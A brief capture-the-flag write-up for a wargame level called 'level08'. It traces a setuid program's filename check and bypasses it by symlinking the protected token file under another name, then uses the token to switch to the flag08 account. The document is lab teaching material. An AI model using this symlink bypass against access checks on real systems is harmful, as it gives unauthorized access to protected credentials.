## level08

First step
```bash
$ ./level08
./level08 [file to read]
```

Second step
```bash
$ ./level08 token
You may not access 'token'
```

Third step
```bash
./level08 token
...
strstr("token", "token")  ...  = "token"
...
```

As we could understand from above, `level08` can read the file ONLY if it's name not `token`. <br>

The solution is simple:
```bash
# Create symbolic link with a different name in the directory with rw rights.
ln -s /home/user/level08/token /var/crash/t0k3n

./level08 /var/crash/t0k3n
```

The token is a password to flag08!
```bash
su flag08
```